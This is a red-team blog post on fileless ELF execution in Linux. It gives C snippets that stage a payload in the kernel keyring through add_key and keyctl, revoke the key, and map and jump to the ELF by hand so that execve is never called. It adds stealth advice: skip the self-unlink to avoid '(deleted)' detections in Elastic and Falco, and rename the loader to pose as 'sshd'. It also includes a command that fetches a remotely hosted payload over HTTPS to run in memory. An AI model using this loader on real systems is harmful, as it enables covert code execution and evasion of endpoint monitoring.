---
title: "Fileless ELF Execution via Kernel Keyring"
date: 2026-09-09T00:00:00-04:00
description: "Using the Linux kernel keyring to stage an ELF in slab memory and execute it via userland exec, skipping execve and the filesystem entirely."
categories: [Evasion]
tags: [Fileless, Linux, Red Team, Kernel, Keyring]
author: 0xMatheuZ
draft: false
ShowToc: true
TocOpen: true
UseHugoToc: true
images:
  - "https://i.imgur.com/VHYFmWT.png"
---

![imgur](https://i.imgur.com/VHYFmWT.png)

Hello guys! So I wanted to show a technique for executing an ELF payload without ever touching the filesystem and without calling execve. The trick is the Linux kernel keyring, and it's a bit different from what most people do for fileless execution, so lets go.

The issue with the usual approaches like `memfd_create` or `O_TMPFILE` is that even though there's no directory entry, you still end up with a file descriptor sitting in `/proc/self/fd/` and an inode somewhere on a real filesystem. What if we skip all that? That's where the keyring comes in.

Linux has had a key management subsystem since 2.6, and you've probably seen `/proc/keys` at some point without thinking much about it. PAM uses it, Kerberos credential caches use it, dm-crypt uses it. The idea is that processes and sessions can store arbitrary blobs in kernel memory, and the two syscalls we care about are `add_key` (248 on x86-64) and `keyctl` (250).

We start by storing the ELF:

```c
long key = syscall(248 /* SYS_add_key */,
                   "user",
                   "_dntry",
                   elf_bytes,
                   elf_size,
                   (long)KEY_SPEC_SESSION_KEYRING);
```

There's a fair bit going on here, so let's break it down. `syscall(248, ...)` is `add_key`, which takes five arguments. The first is the key type, `"user"`, which is the generic type for arbitrary byte blobs. The second is a description string, `"_dntry"` in our case, which is just a label you pick to identify the key later. Then comes the payload pointer and its size. The last argument, `KEY_SPEC_SESSION_KEYRING` (-3), tells the kernel to attach the key to the current session keyring.

What comes back is a `key_serial_t`, which is just an int32 identifying the key, not a file descriptor, so nothing shows up in `/proc/self/fd/`. The actual payload bytes get stored via `kmemdup()` into slab memory in `security/keys/user_defined.c`, no filesystem involved.

The default per-user quota is 20000 bytes across all keys combined, which is plenty for small payloads, and the technique works fine without root. Root has its own separate quota of 25 MB via `/proc/sys/kernel/keys/root_maxbytes`, so if your payload is larger that's the path.

Now, we get the bytes back. `keyctl(KEYCTL_READ)` copies the key payload into a userspace buffer, and you call it twice: once with a null buffer to find out how big the payload is, then again with the actual allocation:

```c
long sz = syscall(250 /* SYS_keyctl */,
                  (long)KEYCTL_READ,
                  key,
                  0L, 0L);

void *buf = mmap(NULL, sz, PROT_READ|PROT_WRITE,
                 MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

syscall(250, (long)KEYCTL_READ, key, (long)buf, sz);
```

The kernel copies straight from slab into the anonymous mapping we just created.

Then we revoke:

```c
syscall(250, (long)KEYCTL_REVOKE, key, 0L, 0L);
```

`KEYCTL_REVOKE` is operation 3. Once that returns, any further `keyctl(READ)` on that serial gives back `EKEYREVOKED` and the slab gets freed when the reference count hits zero, so from here on the payload only exists in that anonymous mapping.

Now we need to actually run it. We can't use `execve` or `execveat` because there's no fd and no path to give them. So we load the ELF manually and we walk the program headers, find the `PT_LOAD` segments, and map each one into anonymous memory at the right address:

```c
void *seg = mmap((void *)seg_va, seg_len,
                 PROT_READ|PROT_WRITE,
                 MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED_NOREPLACE, -1, 0);

memcpy((void *)dst, buf + ph[i].p_offset, ph[i].p_filesz);
mprotect((void *)seg_va, seg_len, prot);
```

`MAP_FIXED_NOREPLACE` is important here: without it, if something's already mapped at that address, `mmap` silently stomps on it. With it you get an error instead, which you can actually handle.

Each segment has `p_filesz` bytes of actual content and potentially a larger `p_memsz`, the difference being BSS. Since we mapped with `MAP_ANONYMOUS`, the kernel already zeroed the entire region before our `memcpy`, so the BSS is already handled. The explicit memset here is defensive:

```c
if (ph[i].p_memsz > ph[i].p_filesz)
    memset((void *)(dst + ph[i].p_filesz), 0, ph[i].p_memsz - ph[i].p_filesz);
```

Once the segments are mapped, we build the stack in x86-64 ABI format (argc, argv pointers, a null, envp pointers, a null, then the auxv pairs), zero all the registers, and jump to the entry point:

```c
register uintptr_t r_entry __asm__("rdi") = entry;
register uintptr_t r_sp    __asm__("rsi") = sp;
__asm__ volatile(
    "mov  %%rsi, %%rsp\n\t"
    "xor  %%eax, %%eax\n\t"
    /* ... zero all other registers ... */
    "jmp  *%%rdi"
    : : "r"(r_entry), "r"(r_sp) : "memory"
);
```

We need to zero `rdx` specifically because glibc's `_start` treats it as `rtld_fini` and registers it as an atexit handler if it's nonzero. With whatever garbage was in `rdx` before the jump, that's a crash on exit.

Before jumping, the loader reads its own path and unlinks itself:

```c
char self_path[PATH_MAX] = {0};
ssize_t n = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
if (n > 0) unlink(self_path);
```

`readlink("/proc/self/exe")` gives back the real filesystem path the binary was loaded from. That's what gets unlinked. The `/proc/self/exe` symlink itself lives in procfs and you can't unlink it directly, but the actual file it points to is fair game. The file disappears from the directory right away, the inode sticks around until the loader exits since the kernel keeps it alive while there's a mapping open.

One bad thing for us is that `/proc/self/exe` ends up showing `(deleted)` while the payload runs, and that suffix is a well-known detection signal since Elastic, Falco, etc actively match on `process.executable` ending in `(deleted)`, so skipping the unlink is actually the better call for stealth. The loader binary stays on disk as a forensic artifact but the running process looks clean, and if you rename the loader to something convincing before running it there is nothing anomalous in the process tree at all.

Running this under strace confirms the full chain. The payload is hosted remotely, the loader fetches it over HTTPS and never writes it anywhere:

```bash
strace -e trace=add_key,keyctl,mmap,mprotect,execve,execveat,unlink ./dntry khttp https://temp.sh/aBcDe/payload sshd
```

![strace output](/img/keyring-strace.png)

Three `keyctl` calls total: the size probe, the actual read, then the revoke. Since there's no exec call, the payload never produces a process start event.

To verify that `/proc/<pid>/fd` is clean while the payload is running, use a demo payload that sleeps. Host it on your server and run:

```bash
./dntry khttp https://temp.sh/aBcDe/payload sshd
# in another terminal:
ls -la /proc/<pid>/fd
cat /proc/<pid>/maps
cat /proc/<pid>/cmdline
```

![/proc/pid/fd showing no payload fds](/img/keyring-procfd.png)

And `/proc/keys` shows the key while it's alive, with its full size:

```
1bb1ba3a I--Q---     1 perm 3f010000  1000  1000 user      _dntry: 9528
```

After `KEYCTL_REVOKE` it flips to `IR-Q---`, the size drops to 0 since the slab was freed, and it sits there until the GC runs. You can watch it in real time:

```bash
watch -n0.1 "grep _dntry /proc/keys"
```

![/proc/keys during exec](/img/keyring-prockeys.png)

The third argument becomes `argv[0]` for the payload and what `prctl(PR_SET_NAME)` sets as the thread name.

![payload running](/img/keyring-demo.png)

That's the full chain. The payload goes from HTTP into kernel slab memory, gets copied into an anonymous mapping, and runs via a direct jump with no execve, no fd, no inode anywhere in the VFS. The only artifact that ever existed on disk was the loader itself.

The keyring is one of those kernel subsystems that nobody thinks about for this kind of thing, which is part of what makes it interesting.

---

*Source: [github.com/MatheuZSecurity/Dntry](https://github.com/MatheuZSecurity/Dntry)*
